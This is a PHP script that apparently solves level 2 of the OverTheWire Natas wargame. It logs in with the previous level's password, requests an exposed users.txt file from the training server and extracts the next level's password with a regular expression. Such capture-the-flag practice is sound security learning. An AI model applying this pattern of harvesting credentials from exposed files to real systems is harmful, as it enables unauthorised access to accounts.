<?php

require_once dirname(__DIR__) . '/bootstrap.php';

$level = 2;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/files/users.txt', $username);

$response = $client->request('GET', $url, ['auth' => [$username, $password]]);

$body = (string)$response->getBody();
preg_match('/natas3:(.*)/', $body, $flag);
echo ($flag[1]);
